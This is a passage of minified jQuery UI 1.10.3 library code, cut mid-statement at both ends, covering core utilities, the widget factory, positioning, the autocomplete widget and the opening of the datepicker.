t=e.ui.ie&&/(static|relative)/.test(this.css("position"))||/absolute/.test(this.css("position"))?this.parents().filter(function(){return/(relative|absolute|fixed)/.test(e.css(this,"position"))&&/(auto|scroll)/.test(e.css(this,"overflow")+e.css(this,"overflow-y")+e.css(this,"overflow-x"))}).eq(0):this.parents().filter(function(){return/(auto|scroll)/.test(e.css(this,"overflow")+e.css(this,"overflow-y")+e.css(this,"overflow-x"))}).eq(0),/fixed/.test(this.css("position"))||!t.length?e(document):t},zIndex:function(i){if(i!==t)return this.css("zIndex",i);if(this.length)for(var s,a,n=e(this[0]);n.length&&n[0]!==document;){if(s=n.css("position"),("absolute"===s||"relative"===s||"fixed"===s)&&(a=parseInt(n.css("zIndex"),10),!isNaN(a)&&0!==a))return a;n=n.parent()}return 0},uniqueId:function(){return this.each(function(){this.id||(this.id="ui-id-"+ ++a)})},removeUniqueId:function(){return this.each(function(){n.test(this.id)&&e(this).removeAttr("id")})}}),e.extend(e.expr[":"],{data:e.expr.createPseudo?e.expr.createPseudo(function(t){return function(i){return!!e.data(i,t)}}):function(t,i,s){return!!e.data(t,s[3])},focusable:function(t){return i(t,!isNaN(e.attr(t,"tabindex")))},tabbable:function(t){var s=e.attr(t,"tabindex"),a=isNaN(s);return(a||s>=0)&&i(t,!a)}}),e("<a>").outerWidth(1).jquery||e.each(["Width","Height"],function(i,s){function a(t,i,s,a){return e.each(n,function(){i-=parseFloat(e.css(t,"padding"+this))||0,s&&(i-=parseFloat(e.css(t,"border"+this+"Width"))||0),a&&(i-=parseFloat(e.css(t,"margin"+this))||0)}),i}var n="Width"===s?["Left","Right"]:["Top","Bottom"],r=s.toLowerCase(),o={innerWidth:e.fn.innerWidth,innerHeight:e.fn.innerHeight,outerWidth:e.fn.outerWidth,outerHeight:e.fn.outerHeight};e.fn["inner"+s]=function(i){return i===t?o["inner"+s].call(this):this.each(function(){e(this).css(r,a(this,i)+"px")})},e.fn["outer"+s]=function(t,i){return"number"!=typeof t?o["outer"+s].call(this,t):this.each(function(){e(this).css(r,a(this,t,!0,i)+"px")})}}),e.fn.addBack||(e.fn.addBack=function(e){return this.add(null==e?this.prevObject:this.prevObject.filter(e))}),e("<a>").data("a-b","a").removeData("a-b").data("a-b")&&(e.fn.removeData=function(t){return function(i){return arguments.length?t.call(this,e.camelCase(i)):t.call(this)}}(e.fn.removeData)),e.ui.ie=!!/msie [\w.]+/.exec(navigator.userAgent.toLowerCase()),e.support.selectstart="onselectstart"in document.createElement("div"),e.fn.extend({disableSelection:function(){return this.bind((e.support.selectstart?"selectstart":"mousedown")+".ui-disableSelection",function(e){e.preventDefault()})},enableSelection:function(){return this.unbind(".ui-disableSelection")}}),e.extend(e.ui,{plugin:{add:function(t,i,s){var a,n=e.ui[t].prototype;for(a in s)n.plugins[a]=n.plugins[a]||[],n.plugins[a].push([i,s[a]])},call:function(e,t,i){var s,a=e.plugins[t];if(a&&e.element[0].parentNode&&11!==e.element[0].parentNode.nodeType)for(s=0;a.length>s;s++)e.options[a[s][0]]&&a[s][1].apply(e.element,i)}},hasScroll:function(t,i){if("hidden"===e(t).css("overflow"))return!1;var s=i&&"left"===i?"scrollLeft":"scrollTop",a=!1;return t[s]>0?!0:(t[s]=1,a=t[s]>0,t[s]=0,a)}})})(jQuery);(function(e,t){var i=0,s=Array.prototype.slice,n=e.cleanData;e.cleanData=function(t){for(var i,s=0;null!=(i=t[s]);s++)try{e(i).triggerHandler("remove")}catch(a){}n(t)},e.widget=function(i,s,n){var a,r,o,h,l={},u=i.split(".")[0];i=i.split(".")[1],a=u+"-"+i,n||(n=s,s=e.Widget),e.expr[":"][a.toLowerCase()]=function(t){return!!e.data(t,a)},e[u]=e[u]||{},r=e[u][i],o=e[u][i]=function(e,i){return this._createWidget?(arguments.length&&this._createWidget(e,i),t):new o(e,i)},e.extend(o,r,{version:n.version,_proto:e.extend({},n),_childConstructors:[]}),h=new s,h.options=e.widget.extend({},h.options),e.each(n,function(i,n){return e.isFunction(n)?(l[i]=function(){var e=function(){return s.prototype[i].apply(this,arguments)},t=function(e){return s.prototype[i].apply(this,e)};return function(){var i,s=this._super,a=this._superApply;return this._super=e,this._superApply=t,i=n.apply(this,arguments),this._super=s,this._superApply=a,i}}(),t):(l[i]=n,t)}),o.prototype=e.widget.extend(h,{widgetEventPrefix:r?h.widgetEventPrefix:i},l,{constructor:o,namespace:u,widgetName:i,widgetFullName:a}),r?(e.each(r._childConstructors,function(t,i){var s=i.prototype;e.widget(s.namespace+"."+s.widgetName,o,i._proto)}),delete r._childConstructors):s._childConstructors.push(o),e.widget.bridge(i,o)},e.widget.extend=function(i){for(var n,a,r=s.call(arguments,1),o=0,h=r.length;h>o;o++)for(n in r[o])a=r[o][n],r[o].hasOwnProperty(n)&&a!==t&&(i[n]=e.isPlainObject(a)?e.isPlainObject(i[n])?e.widget.extend({},i[n],a):e.widget.extend({},a):a);return i},e.widget.bridge=function(i,n){var a=n.prototype.widgetFullName||i;e.fn[i]=function(r){var o="string"==typeof r,h=s.call(arguments,1),l=this;return r=!o&&h.length?e.widget.extend.apply(null,[r].concat(h)):r,o?this.each(function(){var s,n=e.data(this,a);return n?e.isFunction(n[r])&&"_"!==r.charAt(0)?(s=n[r].apply(n,h),s!==n&&s!==t?(l=s&&s.jquery?l.pushStack(s.get()):s,!1):t):e.error("no such method '"+r+"' for "+i+" widget instance"):e.error("cannot call methods on "+i+" prior to initialization; "+"attempted to call method '"+r+"'")}):this.each(function(){var t=e.data(this,a);t?t.option(r||{})._init():e.data(this,a,new n(r,this))}),l}},e.Widget=function(){},e.Widget._childConstructors=[],e.Widget.prototype={widgetName:"widget",widgetEventPrefix:"",defaultElement:"<div>",options:{disabled:!1,create:null},_createWidget:function(t,s){s=e(s||this.defaultElement||this)[0],this.element=e(s),this.uuid=i++,this.eventNamespace="."+this.widgetName+this.uuid,this.options=e.widget.extend({},this.options,this._getCreateOptions(),t),this.bindings=e(),this.hoverable=e(),this.focusable=e(),s!==this&&(e.data(s,this.widgetFullName,this),this._on(!0,this.element,{remove:function(e){e.target===s&&this.destroy()}}),this.document=e(s.style?s.ownerDocument:s.document||s),this.window=e(this.document[0].defaultView||this.document[0].parentWindow)),this._create(),this._trigger("create",null,this._getCreateEventData()),this._init()},_getCreateOptions:e.noop,_getCreateEventData:e.noop,_create:e.noop,_init:e.noop,destroy:function(){this._destroy(),this.element.unbind(this.eventNamespace).removeData(this.widgetName).removeData(this.widgetFullName).removeData(e.camelCase(this.widgetFullName)),this.widget().unbind(this.eventNamespace).removeAttr("aria-disabled").removeClass(this.widgetFullName+"-disabled "+"ui-state-disabled"),this.bindings.unbind(this.eventNamespace),this.hoverable.removeClass("ui-state-hover"),this.focusable.removeClass("ui-state-focus")},_destroy:e.noop,widget:function(){return this.element},option:function(i,s){var n,a,r,o=i;if(0===arguments.length)return e.widget.extend({},this.options);if("string"==typeof i)if(o={},n=i.split("."),i=n.shift(),n.length){for(a=o[i]=e.widget.extend({},this.options[i]),r=0;n.length-1>r;r++)a[n[r]]=a[n[r]]||{},a=a[n[r]];if(i=n.pop(),s===t)return a[i]===t?null:a[i];a[i]=s}else{if(s===t)return this.options[i]===t?null:this.options[i];o[i]=s}return this._setOptions(o),this},_setOptions:function(e){var t;for(t in e)this._setOption(t,e[t]);return this},_setOption:function(e,t){return this.options[e]=t,"disabled"===e&&(this.widget().toggleClass(this.widgetFullName+"-disabled ui-state-disabled",!!t).attr("aria-disabled",t),this.hoverable.removeClass("ui-state-hover"),this.focusable.removeClass("ui-state-focus")),this},enable:function(){return this._setOption("disabled",!1)},disable:function(){return this._setOption("disabled",!0)},_on:function(i,s,n){var a,r=this;"boolean"!=typeof i&&(n=s,s=i,i=!1),n?(s=a=e(s),this.bindings=this.bindings.add(s)):(n=s,s=this.element,a=this.widget()),e.each(n,function(n,o){function h(){return i||r.options.disabled!==!0&&!e(this).hasClass("ui-state-disabled")?("string"==typeof o?r[o]:o).apply(r,arguments):t}"string"!=typeof o&&(h.guid=o.guid=o.guid||h.guid||e.guid++);var l=n.match(/^(\w+)\s*(.*)$/),u=l[1]+r.eventNamespace,c=l[2];c?a.delegate(c,u,h):s.bind(u,h)})},_off:function(e,t){t=(t||"").split(" ").join(this.eventNamespace+" ")+this.eventNamespace,e.unbind(t).undelegate(t)},_delay:function(e,t){function i(){return("string"==typeof e?s[e]:e).apply(s,arguments)}var s=this;return setTimeout(i,t||0)},_hoverable:function(t){this.hoverable=this.hoverable.add(t),this._on(t,{mouseenter:function(t){e(t.currentTarget).addClass("ui-state-hover")},mouseleave:function(t){e(t.currentTarget).removeClass("ui-state-hover")}})},_focusable:function(t){this.focusable=this.focusable.add(t),this._on(t,{focusin:function(t){e(t.currentTarget).addClass("ui-state-focus")},focusout:function(t){e(t.currentTarget).removeClass("ui-state-focus")}})},_trigger:function(t,i,s){var n,a,r=this.options[t];if(s=s||{},i=e.Event(i),i.type=(t===this.widgetEventPrefix?t:this.widgetEventPrefix+t).toLowerCase(),i.target=this.element[0],a=i.originalEvent)for(n in a)n in i||(i[n]=a[n]);return this.element.trigger(i,s),!(e.isFunction(r)&&r.apply(this.element[0],[i].concat(s))===!1||i.isDefaultPrevented())}},e.each({show:"fadeIn",hide:"fadeOut"},function(t,i){e.Widget.prototype["_"+t]=function(s,n,a){"string"==typeof n&&(n={effect:n});var r,o=n?n===!0||"number"==typeof n?i:n.effect||i:t;n=n||{},"number"==typeof n&&(n={duration:n}),r=!e.isEmptyObject(n),n.complete=a,n.delay&&s.delay(n.delay),r&&e.effects&&e.effects.effect[o]?s[t](n):o!==t&&s[o]?s[o](n.duration,n.easing,a):s.queue(function(i){e(this)[t](),a&&a.call(s[0]),i()})}})})(jQuery);(function(t,e){function i(t,e,i){return[parseFloat(t[0])*(p.test(t[0])?e/100:1),parseFloat(t[1])*(p.test(t[1])?i/100:1)]}function s(e,i){return parseInt(t.css(e,i),10)||0}function n(e){var i=e[0];return 9===i.nodeType?{width:e.width(),height:e.height(),offset:{top:0,left:0}}:t.isWindow(i)?{width:e.width(),height:e.height(),offset:{top:e.scrollTop(),left:e.scrollLeft()}}:i.preventDefault?{width:0,height:0,offset:{top:i.pageY,left:i.pageX}}:{width:e.outerWidth(),height:e.outerHeight(),offset:e.offset()}}t.ui=t.ui||{};var a,o=Math.max,r=Math.abs,h=Math.round,l=/left|center|right/,c=/top|center|bottom/,u=/[\+\-]\d+(\.[\d]+)?%?/,d=/^\w+/,p=/%$/,f=t.fn.position;t.position={scrollbarWidth:function(){if(a!==e)return a;var i,s,n=t("<div style='display:block;width:50px;height:50px;overflow:hidden;'><div style='height:100px;width:auto;'></div></div>"),o=n.children()[0];return t("body").append(n),i=o.offsetWidth,n.css("overflow","scroll"),s=o.offsetWidth,i===s&&(s=n[0].clientWidth),n.remove(),a=i-s},getScrollInfo:function(e){var i=e.isWindow?"":e.element.css("overflow-x"),s=e.isWindow?"":e.element.css("overflow-y"),n="scroll"===i||"auto"===i&&e.width<e.element[0].scrollWidth,a="scroll"===s||"auto"===s&&e.height<e.element[0].scrollHeight;return{width:a?t.position.scrollbarWidth():0,height:n?t.position.scrollbarWidth():0}},getWithinInfo:function(e){var i=t(e||window),s=t.isWindow(i[0]);return{element:i,isWindow:s,offset:i.offset()||{left:0,top:0},scrollLeft:i.scrollLeft(),scrollTop:i.scrollTop(),width:s?i.width():i.outerWidth(),height:s?i.height():i.outerHeight()}}},t.fn.position=function(e){if(!e||!e.of)return f.apply(this,arguments);e=t.extend({},e);var a,p,m,g,v,b,_=t(e.of),y=t.position.getWithinInfo(e.within),w=t.position.getScrollInfo(y),x=(e.collision||"flip").split(" "),k={};return b=n(_),_[0].preventDefault&&(e.at="left top"),p=b.width,m=b.height,g=b.offset,v=t.extend({},g),t.each(["my","at"],function(){var t,i,s=(e[this]||"").split(" ");1===s.length&&(s=l.test(s[0])?s.concat(["center"]):c.test(s[0])?["center"].concat(s):["center","center"]),s[0]=l.test(s[0])?s[0]:"center",s[1]=c.test(s[1])?s[1]:"center",t=u.exec(s[0]),i=u.exec(s[1]),k[this]=[t?t[0]:0,i?i[0]:0],e[this]=[d.exec(s[0])[0],d.exec(s[1])[0]]}),1===x.length&&(x[1]=x[0]),"right"===e.at[0]?v.left+=p:"center"===e.at[0]&&(v.left+=p/2),"bottom"===e.at[1]?v.top+=m:"center"===e.at[1]&&(v.top+=m/2),a=i(k.at,p,m),v.left+=a[0],v.top+=a[1],this.each(function(){var n,l,c=t(this),u=c.outerWidth(),d=c.outerHeight(),f=s(this,"marginLeft"),b=s(this,"marginTop"),D=u+f+s(this,"marginRight")+w.width,T=d+b+s(this,"marginBottom")+w.height,C=t.extend({},v),M=i(k.my,c.outerWidth(),c.outerHeight());"right"===e.my[0]?C.left-=u:"center"===e.my[0]&&(C.left-=u/2),"bottom"===e.my[1]?C.top-=d:"center"===e.my[1]&&(C.top-=d/2),C.left+=M[0],C.top+=M[1],t.support.offsetFractions||(C.left=h(C.left),C.top=h(C.top)),n={marginLeft:f,marginTop:b},t.each(["left","top"],function(i,s){t.ui.position[x[i]]&&t.ui.position[x[i]][s](C,{targetWidth:p,targetHeight:m,elemWidth:u,elemHeight:d,collisionPosition:n,collisionWidth:D,collisionHeight:T,offset:[a[0]+M[0],a[1]+M[1]],my:e.my,at:e.at,within:y,elem:c})}),e.using&&(l=function(t){var i=g.left-C.left,s=i+p-u,n=g.top-C.top,a=n+m-d,h={target:{element:_,left:g.left,top:g.top,width:p,height:m},element:{element:c,left:C.left,top:C.top,width:u,height:d},horizontal:0>s?"left":i>0?"right":"center",vertical:0>a?"top":n>0?"bottom":"middle"};u>p&&p>r(i+s)&&(h.horizontal="center"),d>m&&m>r(n+a)&&(h.vertical="middle"),h.important=o(r(i),r(s))>o(r(n),r(a))?"horizontal":"vertical",e.using.call(this,t,h)}),c.offset(t.extend(C,{using:l}))})},t.ui.position={fit:{left:function(t,e){var i,s=e.within,n=s.isWindow?s.scrollLeft:s.offset.left,a=s.width,r=t.left-e.collisionPosition.marginLeft,h=n-r,l=r+e.collisionWidth-a-n;e.collisionWidth>a?h>0&&0>=l?(i=t.left+h+e.collisionWidth-a-n,t.left+=h-i):t.left=l>0&&0>=h?n:h>l?n+a-e.collisionWidth:n:h>0?t.left+=h:l>0?t.left-=l:t.left=o(t.left-r,t.left)},top:function(t,e){var i,s=e.within,n=s.isWindow?s.scrollTop:s.offset.top,a=e.within.height,r=t.top-e.collisionPosition.marginTop,h=n-r,l=r+e.collisionHeight-a-n;e.collisionHeight>a?h>0&&0>=l?(i=t.top+h+e.collisionHeight-a-n,t.top+=h-i):t.top=l>0&&0>=h?n:h>l?n+a-e.collisionHeight:n:h>0?t.top+=h:l>0?t.top-=l:t.top=o(t.top-r,t.top)}},flip:{left:function(t,e){var i,s,n=e.within,a=n.offset.left+n.scrollLeft,o=n.width,h=n.isWindow?n.scrollLeft:n.offset.left,l=t.left-e.collisionPosition.marginLeft,c=l-h,u=l+e.collisionWidth-o-h,d="left"===e.my[0]?-e.elemWidth:"right"===e.my[0]?e.elemWidth:0,p="left"===e.at[0]?e.targetWidth:"right"===e.at[0]?-e.targetWidth:0,f=-2*e.offset[0];0>c?(i=t.left+d+p+f+e.collisionWidth-o-a,(0>i||r(c)>i)&&(t.left+=d+p+f)):u>0&&(s=t.left-e.collisionPosition.marginLeft+d+p+f-h,(s>0||u>r(s))&&(t.left+=d+p+f))},top:function(t,e){var i,s,n=e.within,a=n.offset.top+n.scrollTop,o=n.height,h=n.isWindow?n.scrollTop:n.offset.top,l=t.top-e.collisionPosition.marginTop,c=l-h,u=l+e.collisionHeight-o-h,d="top"===e.my[1],p=d?-e.elemHeight:"bottom"===e.my[1]?e.elemHeight:0,f="top"===e.at[1]?e.targetHeight:"bottom"===e.at[1]?-e.targetHeight:0,m=-2*e.offset[1];0>c?(s=t.top+p+f+m+e.collisionHeight-o-a,t.top+p+f+m>c&&(0>s||r(c)>s)&&(t.top+=p+f+m)):u>0&&(i=t.top-e.collisionPosition.marginTop+p+f+m-h,t.top+p+f+m>u&&(i>0||u>r(i))&&(t.top+=p+f+m))}},flipfit:{left:function(){t.ui.position.flip.left.apply(this,arguments),t.ui.position.fit.left.apply(this,arguments)},top:function(){t.ui.position.flip.top.apply(this,arguments),t.ui.position.fit.top.apply(this,arguments)}}},function(){var e,i,s,n,a,o=document.getElementsByTagName("body")[0],r=document.createElement("div");e=document.createElement(o?"div":"body"),s={visibility:"hidden",width:0,height:0,border:0,margin:0,background:"none"},o&&t.extend(s,{position:"absolute",left:"-1000px",top:"-1000px"});for(a in s)e.style[a]=s[a];e.appendChild(r),i=o||document.documentElement,i.insertBefore(e,i.firstChild),r.style.cssText="position: absolute; left: 10.7432222px;",n=t(r).offset().left,t.support.offsetFractions=n>10&&11>n,e.innerHTML="",i.removeChild(e)}()})(jQuery);(function(t){var e=0;t.widget("ui.autocomplete",{version:"1.10.3",defaultElement:"<input>",options:{appendTo:null,autoFocus:!1,delay:300,minLength:1,position:{my:"left top",at:"left bottom",collision:"none"},source:null,change:null,close:null,focus:null,open:null,response:null,search:null,select:null},pending:0,_create:function(){var e,i,s,n=this.element[0].nodeName.toLowerCase(),a="textarea"===n,o="input"===n;this.isMultiLine=a?!0:o?!1:this.element.prop("isContentEditable"),this.valueMethod=this.element[a||o?"val":"text"],this.isNewMenu=!0,this.element.addClass("ui-autocomplete-input").attr("autocomplete","off"),this._on(this.element,{keydown:function(n){if(this.element.prop("readOnly"))return e=!0,s=!0,i=!0,undefined;e=!1,s=!1,i=!1;var a=t.ui.keyCode;switch(n.keyCode){case a.PAGE_UP:e=!0,this._move("previousPage",n);break;case a.PAGE_DOWN:e=!0,this._move("nextPage",n);break;case a.UP:e=!0,this._keyEvent("previous",n);break;case a.DOWN:e=!0,this._keyEvent("next",n);break;case a.ENTER:case a.NUMPAD_ENTER:this.menu.active&&(e=!0,n.preventDefault(),this.menu.select(n));break;case a.TAB:this.menu.active&&this.menu.select(n);break;case a.ESCAPE:this.menu.element.is(":visible")&&(this._value(this.term),this.close(n),n.preventDefault());break;default:i=!0,this._searchTimeout(n)}},keypress:function(s){if(e)return e=!1,(!this.isMultiLine||this.menu.element.is(":visible"))&&s.preventDefault(),undefined;if(!i){var n=t.ui.keyCode;switch(s.keyCode){case n.PAGE_UP:this._move("previousPage",s);break;case n.PAGE_DOWN:this._move("nextPage",s);break;case n.UP:this._keyEvent("previous",s);break;case n.DOWN:this._keyEvent("next",s)}}},input:function(t){return s?(s=!1,t.preventDefault(),undefined):(this._searchTimeout(t),undefined)},focus:function(){this.selectedItem=null,this.previous=this._value()},blur:function(t){return this.cancelBlur?(delete this.cancelBlur,undefined):(clearTimeout(this.searching),this.close(t),this._change(t),undefined)}}),this._initSource(),this.menu=t("<ul>").addClass("ui-autocomplete ui-front").appendTo(this._appendTo()).menu({role:null}).hide().data("ui-menu"),this._on(this.menu.element,{mousedown:function(e){e.preventDefault(),this.cancelBlur=!0,this._delay(function(){delete this.cancelBlur});var i=this.menu.element[0];t(e.target).closest(".ui-menu-item").length||this._delay(function(){var e=this;this.document.one("mousedown",function(s){s.target===e.element[0]||s.target===i||t.contains(i,s.target)||e.close()})})},menufocus:function(e,i){if(this.isNewMenu&&(this.isNewMenu=!1,e.originalEvent&&/^mouse/.test(e.originalEvent.type)))return this.menu.blur(),this.document.one("mousemove",function(){t(e.target).trigger(e.originalEvent)}),undefined;var s=i.item.data("ui-autocomplete-item");!1!==this._trigger("focus",e,{item:s})?e.originalEvent&&/^key/.test(e.originalEvent.type)&&this._value(s.value):this.liveRegion.text(s.value)},menuselect:function(t,e){var i=e.item.data("ui-autocomplete-item"),s=this.previous;this.element[0]!==this.document[0].activeElement&&(this.element.focus(),this.previous=s,this._delay(function(){this.previous=s,this.selectedItem=i})),!1!==this._trigger("select",t,{item:i})&&this._value(i.value),this.term=this._value(),this.close(t),this.selectedItem=i}}),this.liveRegion=t("<span>",{role:"status","aria-live":"polite"}).addClass("ui-helper-hidden-accessible").insertBefore(this.element),this._on(this.window,{beforeunload:function(){this.element.removeAttr("autocomplete")}})},_destroy:function(){clearTimeout(this.searching),this.element.removeClass("ui-autocomplete-input").removeAttr("autocomplete"),this.menu.element.remove(),this.liveRegion.remove()},_setOption:function(t,e){this._super(t,e),"source"===t&&this._initSource(),"appendTo"===t&&this.menu.element.appendTo(this._appendTo()),"disabled"===t&&e&&this.xhr&&this.xhr.abort()},_appendTo:function(){var e=this.options.appendTo;return e&&(e=e.jquery||e.nodeType?t(e):this.document.find(e).eq(0)),e||(e=this.element.closest(".ui-front")),e.length||(e=this.document[0].body),e},_initSource:function(){var e,i,s=this;t.isArray(this.options.source)?(e=this.options.source,this.source=function(i,s){s(t.ui.autocomplete.filter(e,i.term))}):"string"==typeof this.options.source?(i=this.options.source,this.source=function(e,n){s.xhr&&s.xhr.abort(),s.xhr=t.ajax({url:i,data:e,dataType:"json",success:function(t){n(t)},error:function(){n([])}})}):this.source=this.options.source},_searchTimeout:function(t){clearTimeout(this.searching),this.searching=this._delay(function(){this.term!==this._value()&&(this.selectedItem=null,this.search(null,t))},this.options.delay)},search:function(t,e){return t=null!=t?t:this._value(),this.term=this._value(),t.length<this.options.minLength?this.close(e):this._trigger("search",e)!==!1?this._search(t):undefined},_search:function(t){this.pending++,this.element.addClass("ui-autocomplete-loading"),this.cancelSearch=!1,this.source({term:t},this._response())},_response:function(){var t=this,i=++e;return function(s){i===e&&t.__response(s),t.pending--,t.pending||t.element.removeClass("ui-autocomplete-loading")}},__response:function(t){t&&(t=this._normalize(t)),this._trigger("response",null,{content:t}),!this.options.disabled&&t&&t.length&&!this.cancelSearch?(this._suggest(t),this._trigger("open")):this._close()},close:function(t){this.cancelSearch=!0,this._close(t)},_close:function(t){this.menu.element.is(":visible")&&(this.menu.element.hide(),this.menu.blur(),this.isNewMenu=!0,this._trigger("close",t))},_change:function(t){this.previous!==this._value()&&this._trigger("change",t,{item:this.selectedItem})},_normalize:function(e){return e.length&&e[0].label&&e[0].value?e:t.map(e,function(e){return"string"==typeof e?{label:e,value:e}:t.extend({label:e.label||e.value,value:e.value||e.label},e)})},_suggest:function(e){var i=this.menu.element.empty();this._renderMenu(i,e),this.isNewMenu=!0,this.menu.refresh(),i.show(),this._resizeMenu(),i.position(t.extend({of:this.element},this.options.position)),this.options.autoFocus&&this.menu.next()},_resizeMenu:function(){var t=this.menu.element;t.outerWidth(Math.max(t.width("").outerWidth()+1,this.element.outerWidth()))},_renderMenu:function(e,i){var s=this;t.each(i,function(t,i){s._renderItemData(e,i)})},_renderItemData:function(t,e){return this._renderItem(t,e).data("ui-autocomplete-item",e)},_renderItem:function(e,i){return t("<li>").append(t("<a>").text(i.label)).appendTo(e)},_move:function(t,e){return this.menu.element.is(":visible")?this.menu.isFirstItem()&&/^previous/.test(t)||this.menu.isLastItem()&&/^next/.test(t)?(this._value(this.term),this.menu.blur(),undefined):(this.menu[t](e),undefined):(this.search(null,e),undefined)},widget:function(){return this.menu.element},_value:function(){return this.valueMethod.apply(this.element,arguments)},_keyEvent:function(t,e){(!this.isMultiLine||this.menu.element.is(":visible"))&&(this._move(t,e),e.preventDefault())}}),t.extend(t.ui.autocomplete,{escapeRegex:function(t){return t.replace(/[\-\[\]{}()*+?.,\\\^$|#\s]/g,"\\$&")},filter:function(e,i){var s=RegExp(t.ui.autocomplete.escapeRegex(i),"i");return t.grep(e,function(t){return s.test(t.label||t.value||t)})}}),t.widget("ui.autocomplete",t.ui.autocomplete,{options:{messages:{noResults:"No search results.",results:function(t){return t+(t>1?" results are":" result is")+" available, use up and down arrow keys to navigate."}}},__response:function(t){var e;this._superApply(arguments),this.options.disabled||this.cancelSearch||(e=t&&t.length?this.options.messages.results(t.length):this.options.messages.noResults,this.liveRegion.text(e))}})})(jQuery);(function(t,e){function i(){this._curInst=null,this._keyEvent=!1,this._disabledInputs=[],this._datepickerShowing=!1,this._inDialog=!1,this._mainDivId="ui-datepicker-div",this._inlineClass="ui-datepicker-inline",this._appendClass="ui-datepicker-append",this._triggerClass="ui-datepicker-trigger",this._dialogClass="ui-datepicker-dialog",this._disableClass="ui-datepicker-disabled",this._unselectableClass="ui-datepicker-unselectable",this._currentClass="ui-datepicker-current-day",this._dayOverClass="ui-datepicker-days-cell-over",this.regional=[],this.regional[""]={closeText:"Done",prevText:"Prev",nextText:"Next",currentText:"Today",monthNames:["January","February","March","April","May","June","July","August","September","October","November","December"],monthNamesShort:["Jan","Feb","Mar","Apr","May","Jun","Jul","Aug","Sep","Oct","Nov","Dec"],dayNames:["Sunday","Monday","Tuesday","Wednesday","Thursday","Friday","Saturday"],dayNamesShort:["Sun","Mon","Tue","Wed","Thu","Fri","Sat"],dayNamesMin:["Su","Mo","Tu","We","Th","Fr","Sa"],weekHeader:"Wk",dateFormat:"mm/dd/yy",firstDay:0,isRTL:!1,showMonthAfterYear:!1,yearSuffix:""},this._defaults={showOn:"focus",showAnim:"fadeIn",showOptions:{},defaultDate:null,appendText:"",buttonText:"...",buttonImage:"",buttonImageOnly:!1,hideIfNoPrevNext:!1,navigationAsDateFormat:!1,gotoCurrent:!1,changeMonth:!1,changeYear:!1,yearRange:"c-10:c+10",showOtherMonths:!1,selectOtherMonths:!1,showWeek:!1,calculateWeek:this.iso8601Week,shortYearCutoff:"+10",minDate:null,maxDate:null,duration:"fast",beforeShowDay:null,beforeShow:null,onSelect:null,onChangeMonthYear:null,onClose:null,numberOfMonths:1,showCurrentAtPos:0,stepMonths:1,stepBigMonths:12,altField:"",altFormat:"",constrainInput:!0,showButtonPanel:!1,autoSize:!1,disabled:!1},t.extend(this._defaults,this.regional[""]),this.dpDiv=s(t("<div id='"+this._mainDivId+"' class='ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all'></div>"))}function s(e){var i="button, .ui-datepicker-prev, .ui-datepicker-next, .ui-datepicker-calendar td a";return e.delegate(i,"mouseout",function(){t(this).removeClass("ui-state-hover"),-1!==this.className.indexOf("ui-datepicker-prev")&&t(this).removeClass("ui-datepicker-prev-hover"),-1!==this.className.indexOf("ui-datepicker-next")&&t(this).removeClass("ui-datepicker-next-hover")}).delegate(i,"mouseover",function(){t.datepicker._isDisabledDatepicker(a.inline?e.parent()[0]:a.input[0])||(t(this).parents(".ui-datepicker-calendar").find("a").removeClass("ui-state-hover"),t(this).addClass("ui-state-hover"),-1!==this.className.indexOf("ui-datepicker-prev")&&t(this).addClass("ui-datepicker-prev-hover"),-1!==this.className.indexOf("ui-datepicker-next")&&t(this).addClass("ui-datepicker-next-hover"))})}function n(e,i){t.extend(e,i);for(var s in i)null==i[s]&&(e[s]=i[s]);return e}t.extend(t.ui,{datepicker:{version:"1.10.3"}});var a,r="datepicker";t.extend(i.prototype,{markerClassName:"hasDatepicker",maxRows:4,_widgetDatepicker:function(){return this.dpDiv},setDefaults:function(t){return n(this._defaults,t||{}),this},_attachDatepicker:function(e,i){var s,n,a;s=e.nodeName.toLowerCase(),n="div"===s||"span"===s,e.id||(this.uuid+=1,e.id="dp"+this.uuid),a=this._newInst(t(e),n),a.settings=t.extend({},i||{}),"input"===s?this._connectDatepicker(e,a):n&&this._inlineDatepicker(e,a)},_newInst:function(e,i){var n=e[0].id.replace(/([^A-Za-z0-9_\-])/g,"\\\\$1");return{id:n,input:e,selectedDay:0,selectedMonth:0,selectedYear:0,drawMonth:0,drawYear:0,inline:i,dpDiv:i?s(t("<div class='"+this._inlineClass+" ui-datepicker ui-widget ui-widget-content ui-helper-clearfix ui-corner-all'></div>")):this.dpDiv}},_connectDatepicker:function(e,i){var s=t(e);i.append=t([]),i.trigger=t([]),s.hasClass(this.markerClassName)||(this._attachments(s,i),s.addClass(this.markerClassName).keydown(this._doKeyDown).keypress(this._doKeyPress).keyup(this._doKeyUp),this._autoSize(i),t.data(e,r,i),i.settings.disabled&&this._disableDatepicker(e))},_attachments:function(e,i){var s,n,a,r=this._get(i,"appendText"),o=this._get(i,"isRTL");i.append&&i.append.remove(),r&&(i.append=t("<span class='"+this._appendClass+"'>"+r+"</span>"),e[o?"before":"after"](i.append)),e.unbind("focus",this._showDatepicker),i.trigger&&i.trigger.remove(),s=this._get(i,"showOn"),("focus"===s||"both"===s)&&e.focus(this._showDatepicker),("button"===s||"both"===s)&&(n=this._get(i,"buttonText"),a=this._get(i,"buttonImage"),i.trigger=t(this._get(i,"buttonImageOnly")?t("<img/>").addClass(this._triggerClass).attr({src:a,alt:n,title:n}):t("<button type='button'></button>").addClass(this._triggerClass).html(a?t("<img/>").attr({src:a,alt:n,title:n}):n)),e[o?"before":"after"](i.trigger),i.trigger.click(function(){return t.datepicker._datepickerShowing&&t.datepicker._lastInput===e[0]?t.datepicker._hideDatepicker():t.datepicker._datepickerShowing&&t.datepicker._lastInput!==e[0]?(t.datepicker._hideDatepicker(),t.datepicker._showDatepicker(e[0])):t.datepicker._showDatepicker(e[0]),!1}))},_autoSize:function(t){if(this._get(t,"autoSize")&&!t.inline){var e,i,s,n,a=new Date(2009,11,20),r=this._get(t,"dateFormat");r.match(/[DM]/)&&(e=function(t){for(i=0,s=0,n=0;t.length>n;n++)t[n].length>i&&(i=t[n].length,s=n);return s},a.setMonth(e(this._get(t,r.match(/MM/)?"monthNames":"monthNamesShort"))),a.setDate(e(this._get(t,r.match(/DD/)?"dayNames":"dayNamesShort"))+20-a.getDay())),t.input.attr("size",this._formatDate(t,a).length)}},_inlineDatepicker:function(e,i){var 